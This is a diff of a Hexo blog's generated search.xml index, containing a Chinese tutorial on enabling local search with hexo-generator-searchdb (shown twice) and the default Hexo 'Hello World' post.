+        <content type="html"><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1><p>1.首先在Hexo的根目录下执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure><p><img src="/2021/03/25/phtest/image-20210325172142569.png" alt="image-20210325172142569"></p><p>有WARN没关系，最后还是可以用的</p><p>2.在全局配置文件_config.yml，新增如下内容</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure><p>3.在主题配置文件_config.yml修改local_search为true</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure><p>4.新建一个页面，命名为 search 。命令如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure><p>5.编辑刚新建的页面，将页面的类型设置为 search</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure><p>6.执行hexo g和hexo d部署完成</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo启用搜索功能</title>
+      <link href="2021/03/25/Hexo%E5%90%AF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"/>
+      <url>2021/03/25/Hexo%E5%90%AF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
+      
+        <content type="html"><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1><p>1.首先在Hexo的根目录下执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure><p><img src="/2021/03/25/Hexo%E5%90%AF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/C:%5CUsers%5C17473%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210325172142569.png" alt="image-20210325172142569"></p><p>有WARN没关系，最后还是可以用的</p><p>2.在全局配置文件_config.yml，新增如下内容</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure><p>3.在主题配置文件_config.yml修改local_search为true</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure><p>4.新建一个页面，命名为 search 。命令如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure><p>5.编辑刚新建的页面，将页面的类型设置为 search</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure><p>6.执行hexo g和hexo d部署完成</p>]]></content>
+      
+      
       <categories>
-        <category>学习</category>
+          
+          <category> 教程 </category>
+          
       </categories>
-      <tags>
-        <tag>web学习</tag>
-        <tag>http</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo启用搜索功能(图片测试)</title>
-    <url>/2021/03/25/phtest/</url>
-    <content><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1>
-<p>1.首先在Hexo的根目录下执行以下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure>
-<p><img src="/2021/03/25/phtest/image-20210325172142569.png" alt="image-20210325172142569"></p>
-<p>有WARN没关系，最后还是可以用的</p>
-<p>2.在全局配置文件_config.yml，新增如下内容</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>
-<p>3.在主题配置文件_config.yml修改local_search为true</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure>
-<p>4.新建一个页面，命名为 search 。命令如下：</p>
-<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure>
-<p>5.编辑刚新建的页面，将页面的类型设置为 search</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure>
-<p>6.执行hexo g和hexo d部署完成</p>
-]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="2021/03/24/hello-world/"/>
+      <url>2021/03/24/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
